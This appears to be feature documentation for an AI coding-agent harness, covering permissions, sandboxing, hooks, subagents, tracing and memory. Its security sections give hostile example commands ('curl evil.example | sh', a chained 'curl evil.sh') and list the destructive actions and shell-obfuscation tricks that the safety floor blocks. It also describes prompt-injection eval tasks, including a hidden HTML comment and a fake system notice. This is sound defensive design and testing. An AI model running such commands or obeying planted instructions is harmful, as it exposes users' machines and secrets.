# Features in depth

Everything beyond the basics in the [README](../README.md): project instructions, permissions and the safety floor, the sandbox, hooks, skills, subagents, routing, memory, tracing, replay and more. Each section is self-contained.

## Project instructions

`AGENTS.md` (or `CLAUDE.md` / `GEMINI.md`) in the project root, and `~/.amness/AGENTS.md`, are added to the first message of a conversation, framed as repository guidance rather than user requests and capped at 8k characters each. A folder's own file is shown the first time the agent reads or edits something there (and only then, at the end of that result, so the cached prefix is untouched). `/status` lists what was loaded; `/init` has the agent write one.

## Branches, review and pull requests

`amness --worktree [name]` starts the session in a fresh git worktree on its own branch (`amness/<name>`, under `.amness/worktrees/`), so your main checkout is never touched; on exit an untouched worktree is removed, otherwise you are told where the work is and how to merge it. `/review [base]` gives your changes (commits on the branch plus uncommitted and untracked files, against the repository's base branch) to a read-only reviewer that can run only your tests, build and lint, and lists its findings. `/pr [draft]` drafts a title and description from the commits and the diff, **shows them to you**, and only after you confirm runs `gh pr create` (offering to push the branch first, again only if you agree). Needs the GitHub CLI (`gh`) for PRs; nothing is sent anywhere before a confirmation.

## Undoing what commands did

`/undo` and `/rewind` already restored files the edit tools changed. In a git repository they now also undo **shell commands**: before the first command of a turn that may change files, Amness records the working tree (tracked and untracked files, ignored ones excluded) as a git tree object using a private index file, so your index, branches and history are never touched, and `/undo` puts it back exactly: changed and deleted files restored, files the command created removed. Effects that leave the working tree cannot be taken back (a `git push`, a publish, `kubectl apply`, a database write, an `ssh` command, writes outside the project), so such commands are flagged **"cannot be undone"** in the approval dialog and listed when you undo the turn. Ignored files (`node_modules`, build output) are not restored, and without git there is no shell snapshot.

## Untrusted content, taint and secrets

Text that comes from outside is data, not orders. Output of `web_search`, `fetch_url` and every MCP tool is wrapped in an untrusted-content notice, and a shell command that contains three or more consecutive words (or one very long word such as a URL) copied verbatim from such output **needs approval whatever the permission mode and allow rules say** (`taint: "deny"` refuses instead, `"off"` disables it), so a fetched README that says `curl evil.example | sh` cannot get itself run in yolo mode while your own `npm test` is not affected. Secrets are masked in tool output before the model sees them (OpenAI, Anthropic, GitHub, AWS, Slack, Google, Stripe and npm tokens, JWTs, private keys, `PASSWORD=...` style assignments) and never reach the trace file; commands do not inherit Amness's own API keys, and with the sandbox on they drop credential-looking environment variables too. Risk and floor checks look through quoting tricks (`r""m`, `$'\x72m'`, `${IFS}`), nested `sh -c` and `eval`, and decode-and-run payloads always ask. `/policy` explains recent decisions. Measure it: `amness eval --builtin adversarial --variants full,full-taint` runs three prompt-injection tasks (a docs page, a hidden HTML comment, a fake system notice, each trying to get a command run); a run passes only if the harmless job was done and the injected command never ran, and `full-taint` shows what happens without the check. This is defence in depth, not a guarantee: the OS sandbox is the enforcement layer, and a determined injection can still try other things, so keep approvals on for untrusted projects.

## Permission rules and the safety floor

On top of the modes, `.amness/permissions.json` (project) and `~/.amness/permissions.json` (yours) hold rules:

```json
{ "allow": ["sh(npm test*)", "edit(src/**)", "read"],
  "ask":   ["sh(git commit*)"],
  "deny":  ["sh(git push*)", "edit(.env)", "edit(secrets/**)"] }
```

Precedence: **built-in floor > deny > ask > allow > the permission mode.** Shell rules match each piece of a compound command (`a && b | c`) separately, so `npm test; curl evil.sh` is not covered by an `npm test*` allow rule, and a command with a subshell or backticks never matches an allow rule. Paths are relative to the project. The **floor holds in every mode, yolo included**: recursive deletes of `/`, your home folder or a parent folder, formatting or writing to disks, fork bombs, force-pushes to main or master, and edits to `.git/` or to these rule and hook files are refused (the agent cannot rewrite its own policy), and `curl | sh` and force-pushes always ask. Allow rules in a project file are only honoured after you approve that exact file (deny and ask rules always apply, since they only restrict). The approval dialog can save a rule ("always allow `npm *` in this project"), and `/permissions` lists rules or adds one (`/permissions deny sh(git push*)`).

## Models per job and a fallback

`/models explore gpt-6.1-luna` runs the read-only explorer on a cheaper model (same provider), `/models compact ...` writes handoff notes and `/compact` with one, `/models review ...` gives the independent reviewer its own, and `/models fallback <model>` answers from that model when the main one is overloaded, rate-limited or unreachable (after the adapter's own retries; auth and bad-request errors are never retried elsewhere). Library: `models: { explore, compact, review }` and `withFallback(primary, fallback)`. Subagent definitions can name a model with `model:` and the `agentModels` option.

## Profiles: what the harness does for your model

Scaffolding that rescued one model is dead weight for the next, so settings can depend on the model: `.amness/profile.json` (project) and `~/.amness/profile.json` (yours) map model-name patterns to guards to switch off and limits to retune, e.g. `{ "models": { "gpt-6*": { "off": ["nudge"], "stagnationTurns": 6, "maxSteps": 50 }, "claude-*": { "off": ["wrapup"] } } }`; the project overrides the user and guards accumulate. `/profile` shows what applies. To choose from data instead of guesses, run an ablation and let the recommender read it: `amness eval --variants ablate --trials 5 --profile-out profile.json --profile-model "gpt-6*"`. It is conservative: a guard is recommended for removal only when taking it out is significantly better, or makes no difference to the pass rate (within 2 points) and is cheaper per solved task; a guard whose removal significantly hurts is marked KEEP; everything unclear stays on; and weak evidence (few tasks) is called out. This follows the lesson from [Anthropic's long-running-harness work](https://www.anthropic.com/engineering/harness-design-long-running-apps) that each component should be removed one at a time and measured. No model-specific defaults ship in the box, because none has been measured yet.

## Tuning the harness (`amness tune`)

`amness tune` tries switching guards off (and optionally other `stagnationTurns` values) one at a time on part of your tasks, keeps a change only if it is no worse and either better or cheaper, then checks all kept changes together on tasks the search never saw. If that held-out check fails, everything is rolled back and nothing is written. The search space is fixed and small on purpose: it never rewrites prompts or code. It costs real model calls and asks first. The logic is tested with a scripted harness; it has not been run on a real model. See `amness tune --help`.

## Several agents at once: best-of-n and parallel parts

Both run each agent in its own git worktree, so attempts cannot disturb each other or your working tree, and both are driven by your `--verify` command.

- `amness run --best-of 3 --verify "npm test" "task"` tries the task up to 3 times, **one at a time, and stops at the first attempt that passes**, so the extra cost is only paid when the first attempt fails. The winner is applied. The library (`bestOfN`) can also run all attempts at once, break ties between passing candidates with extra checks (for example generated tests), a judge function and diff size, and stops starting attempts once a token cap is reached.
- `amness run --parts parts.json --verify "npm test"` runs independent parts (`[{"name": "...", "task": "..."}]`) concurrently, each must pass verify in its own worktree, and the results are then merged one at a time, each through verify again. A part that conflicts or breaks verify after merging is reverted and reported, never left half-applied.

Tested with scripted agents in real git repositories; not yet measured on a real model. More agents can cost more without solving more, so compare cost per solved task before relying on either.

## Approval reviewer (opt-in)

With `"approvalReviewer": true` (or `--approval-reviewer` in headless runs), a second model reads each risky call before you are asked. It can **approve** clearly safe calls with a stated reason (logged as a policy event in the trace and the UI) or pass the call on to you; it can never deny, and it never sees calls from the safety floor or calls containing text copied from untrusted content, which always reach you. If the reviewer fails, times out, or answers with anything but a clear approval, you are asked as usual. It costs one short model call per risky action. Tested with scripted reviewers; whether it approves safely on real model output is not measured.

## Image input

Mention a picture with `@screenshot.png` in the chat, or pass `--image shot.png` to `amness run` (png, jpg, gif, webp; 5 MB and 4 images per message at most, inside the project for `@`). OpenAI (Responses and Chat) and Claude get the image natively. For local servers the vision support is guessed from the model name (llava, gemma3, `-vl`, pixtral...); a model that does not look like a vision model gets a clear message and the image is not sent. Images stay in the conversation, so they are re-sent (and billed) with every later request; start a new conversation when you are done with them. Tested at the wire-format level; not yet tried against live vision models. Pasting an image from the clipboard is not supported.

## Editors: `amness acp`

`amness acp` speaks the [Agent Client Protocol](https://agentclientprotocol.com) on stdin/stdout, so an editor that supports it can host Amness. In Zed: `"agent_servers": { "Amness": { "command": "amness", "args": ["acp"] } }`. Text, tool calls and plans stream to the editor; risky actions arrive as permission requests the editor answers; `session/cancel` stops the turn. Not implemented: loading old sessions, editor-side file and terminal methods, and a VS Code extension. Tested with a scripted client; not yet tried inside a real editor.

## Scheduled runs and the GitHub Action

- `amness schedule add nightly "0 3 * * 1-5" "update the changelog" --verify "npm test"`, then `amness schedule install` prints the crontab lines; `--write` puts them in your crontab (a marked block for this project only; `uninstall` removes it). Runs are headless, risky commands are denied, and output is appended to `.amness/schedule-logs/`.
- `action.yml` is a GitHub Action: `uses: amirsdream/Amness@main` with `task`, optional `verify`, `provider`, `model`, `max-tokens`, and your API key in the step's `env`. It writes the result to the job summary and comments on the pull request. CI checks that it installs and reports without a key; a run against a real model has not been tried.

## Cache-aware routing (opt-in)

`/models cheap <model id>` then `/router on` sends *exploration* steps (reads, searches, `repo_map`, background-process reads) to the cheap model and everything that needs judgement to the main one: the first step, edits, commands, failures, rejected finishes, your new instructions and the final answer. Per-step routing is where the savings are ([AgentRouter](https://arxiv.org/abs/2609.22951) reports large ones with a trained router), but every model has its own prompt cache, so moving to the cheap model costs a cold read of the whole conversation there. The router prices that: it only switches when the exploration streak is long enough (or the cheap model's cache is still warm) for the cheaper cached reads to repay the cold read, with the real price table when both models are known. If the cheap model reaches for an edit, a command, `finish` or a plain-text answer, that step is thrown away and redone by the main model (cheap steps are not streamed, so nothing half-shown is left behind), and reasoning blobs from one model are never sent to the other. `/loop` shows each switch and why. Measure it before trusting it: `amness eval --variants full,full+route --cheap-model <id> --trials 3` reports pass rate and tokens per solved task side by side.

## Custom subagents

Define your own in `.amness/agents/<name>.md` (or `.claude/agents/`, project or home): front matter with `name`, `description`, `tools` (any of `list_files read_file grep write_file edit_file apply_patch sh skill`; default read-only), optional `model` (a key of the `agentModels` option), `isolation: worktree` and `max-steps`, then the agent's system prompt. The lead calls `task({ description, agent })`; the subagent sees only the brief and returns only its summary. A read-only agent runs in parallel with other calls. An agent with write tools shares your permission rules, safety floor, sandbox, approvals and claims ledger, runs alone, and is **forced read-only in plan mode**. With `isolation: worktree` it edits a throwaway git worktree of HEAD instead: your working tree is untouched, the changes come back as a patch file under `.amness/agents/out/`, and the lead reviews it and applies it with `apply_patch({ file })`. `/agents` lists what is defined.

## Skills

A skill is a folder with a `SKILL.md` (a `name:` and a one-line `description:` in front matter, instructions below, optional helper files next to it). Amness finds them in `.amness/skills/`, `.agents/skills/` (Codex, Gemini CLI, OpenCode) and `.claude/skills/` (Claude Code), in the project and in your home folder; the project wins, and so does the first convention listed when names clash. Only names and descriptions go into the first message, so fifty skills cost a few hundred tokens; the model loads one with the `skill` tool when the task matches (and can read the files bundled in its folder, nothing outside it). `/skills` lists what was found and warns about malformed ones. Skills from a repository you cloned are untrusted instructions: they are guidance only and cannot grant permissions.

## OS sandbox (opt-in)

The permission prompts are a policy; the sandbox is enforcement. `/sandbox workspace` (or `--sandbox workspace`, or `sandbox` in the config) runs every shell command, including background ones, under macOS Seatbelt or Linux Bubblewrap: commands can read the machine but write only in the project, temp folders and common package caches, `.git` and the rule files stay read-only, and in `/sandbox strict` the network is cut as well (so `npm install` will fail). It makes yolo mode far safer. If a sandbox is requested where none exists (Windows, or Linux without `bwrap`), commands are refused instead of silently running unprotected. The file tools were already confined to the workspace.

## Code index

In repositories with 25 or more source files Amness adds three read-only tools built from a zero-dependency structural index (symbols, the import graph, where each symbol is used; TypeScript/JavaScript, Python, Go, Rust, Java, Kotlin, C#, Ruby, PHP, C/C++, Swift, Scala; rebuilt incrementally from file modification times): `repo_map(query)` returns the most relevant files for a few words, each with its functions, classes and types and how many files import it; `find_refs(symbol)` gives the definition and every file that uses it; `impact(path)` lists who depends on a file, directly and one step further, and which of its symbols are used elsewhere. Small repositories do not get the tools (grep is enough and tool definitions cost tokens). The index is approximate (regex extraction, import resolution by convention), so it points the way and the agent still reads the code; the eval suite has a mid-sized-repository task to measure whether it pays off for your model.

## Language-server diagnostics (opt-in)

With `"lsp": true` in your config (or `lsp: true` in the library), each edit's result also carries the **errors** an installed language server reports for the file just changed, so type errors are caught one step after they happen instead of at the end. Autodetected servers: `typescript-language-server`, `pyright-langserver`, `gopls`, `rust-analyzer`. Only errors are shown (up to 6 per file), nothing is added when the file is clean or no server is installed, and servers start lazily on first use. Tested against a scripted server; not yet measured on a real model.

## Editing

Four ways to change files, all subject to read-before-edit and the same permission rules: `edit_file` (exact, unique match; or an `edits` list of several replacements applied in order, all or nothing; text that differs only in indentation is still matched when it is unique, and the result says so), `write_file`, and `apply_patch` for changes that span files. `apply_patch` takes the envelope used by Codex (`*** Begin Patch`, `*** Update File: path` with `@@` hunks, `*** Add File`, `*** Delete File`, `*** Move to`, `*** End Patch`) or an ordinary unified diff, applies hunks in order (an `@@ function name` anchor narrows the search), and is **atomic**: if any hunk of any file fails, nothing is written and every failure is named. A patch is judged file by file by permission rules, so one denied file denies the patch.

## Background processes

`sh` waits for a command to finish, so servers and watchers use four more tools: `sh_start` (returns an id; same permission rules as `sh`), `sh_read` (new output since the last read, optionally waiting up to 10 s), `sh_stop` (SIGTERM, then SIGKILL; the whole process group) and `sh_list`. Output is kept in a 200 KB ring buffer, at most 5 run at once, plan mode hides `sh_start`, and everything is killed when you exit. The sidebar lists running processes and `/procs` shows or stops them.

## Tracing

Every loop event (turns with token and cache counts, tool calls with timings, hooks, cache breaks, trims) is written to `.amness/traces/<session>.jsonl`, one JSON line each, so a bad session can be read with `grep` and `jq`. Set `AMNESS_OTLP=http://localhost:4318` (or any OTLP/HTTP collector) to also export OpenTelemetry spans with GenAI attributes (`gen_ai.usage.input_tokens`, `gen_ai.usage.cache_read.input_tokens`, `gen_ai.tool.name`); headless runs take `--trace <file>`. `/loop` shows how many tokens were re-read at full price after cache breaks, with an estimated cost. A full disk or an unreachable collector never stops the agent.

## Replay (test harness changes offline)

Chat sessions and `--trace` runs also record the model's messages and the tools' results. `amness replay .amness/traces/<session>.jsonl [--off loop,stagnation] [--stagnation-turns 4] [--max-steps 20] [--context-budget 30000]` feeds a recorded run back through the *current* harness with no model call and no real tool, and prints exactly which guards, rejections, trims or cache breaks differ from what happened (exit code 1 when anything does). An unchanged harness reproduces a recording identically, so a replay of your real sessions is a free regression test before you ship a change to a guard; after the first difference the model would have said something else, so later lines are indicative. Library: `replayFile`, `replayRun`, `readTrace`.

## Failure mining

`/report` (or `amness traces`) reads your session traces and groups what went wrong into recurring patterns: finishes the verify command rejected, loop and stagnation stops, malformed calls, denied actions, tool errors, with numbers and paths normalised so "5 failing in /a/b.test.ts" and "3 failing in /c/d.test.ts" count as one problem, plus the sessions with the most trouble. To keep a failure from coming back, turn it into an eval task: `/report case <name>` (or `amness traces --case <name> --task "..." --check "<command that exits 0 only when it is really fixed>"`) snapshots the repository **at git HEAD** with your request as the task and your check as the held-out judge, ready for `amness eval --cases .amness/evals/cases`. Add a `"solution"` to the JSON to include it in `--selftest`.

## Hooks

Run your own commands at fixed points of the loop, in the same vocabulary as Claude Code and Codex. Configure them in `.amness/hooks.json` (project) and `~/.amness/hooks.json` (yours):

```json
{ "PreToolUse":  [{ "match": "sh", "command": "./scripts/no-push.sh", "timeout": 10 }],
  "PostToolUse": [{ "match": "edit_file|write_file", "command": "npx prettier --write ." }],
  "Stop":        [{ "command": "./scripts/changelog-updated.sh" }] }
```

Events: `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `PreCompact`, `Stop`. The event arrives as JSON on stdin. Exit `0` allows; exit `2` blocks (stderr goes to the model, or for `UserPromptSubmit` back to you); stdout can be plain text (added as context) or JSON (`{"context": "..."}`, `{"args": {...}}` to rewrite a tool call, `{"decision": "block", "reason": "..."}`). Hooks run without your API keys in their environment, time out after 10 s, and a crash only warns unless the hook sets `"failClosed": true`. **Project hooks run commands on your machine, so Amness asks before running a repository's hooks and remembers your answer for that exact file** (headless runs need `--trust-project`). `/hooks` shows what is active.

## Your own commands

Put `audit.md` in `.amness/commands/` (or `~/.amness/commands/`) and `/audit <args>` runs it as a prompt (`$ARGUMENTS` is substituted; a `description:` front-matter line shows in the popup). Commit the folder to share it with your team.

## Memory

Plain markdown notes in `<project>/.amness/memory` and `~/.amness/memory`, indexed by `MEMORY.md`; edit them like any file. What makes it more than a notebook:

- **Cache-friendly injection.** At the start of a conversation the agent sees a short index (the 25 most relevant or useful notes) plus the notes that best match your request, framed as hints to verify. Later messages add only *new* relevant notes, at the end, so the earlier conversation never changes.
- **Ranked retrieval.** BM25 over name, description and content, with light stemming, blended with how often a note proved useful. Optional **semantic search** (`/memory embeddings on`, OpenAI-compatible providers) adds embedding similarity so a note can match without sharing a word; vectors are cached in `memory/embeddings.json` and recomputed only for changed notes. If the embeddings call fails, keyword search carries on.
- **Learning from outcomes.** Notes that were in front of the model during runs that finished (passed `verify`) rank higher; notes from runs that got stuck or ran out of steps rank lower. A note with 4+ bad runs and under 25% good is suggested for archiving. A plain chat reply changes nothing.
- **Duplicates merge.** Saving a note that says nearly the same as an existing one (same type) updates it instead; the newer wording wins.
- **A small graph.** `[[other-note]]` mentions, and notes that keep being retrieved together, become neighbours; a match pulls its neighbours in at lower rank (`/memory graph`).
- **Forgetting you can undo.** `/memory stale` lists notes never useful (or consistently unhelpful); `/memory prune` moves them to `memory/archive/`. `/memory consolidate` has the model propose merges and archives, shows the plan, and applies it only if you agree. Nothing is deleted.

The agent saves durable lessons itself (the real test command, your corrections).
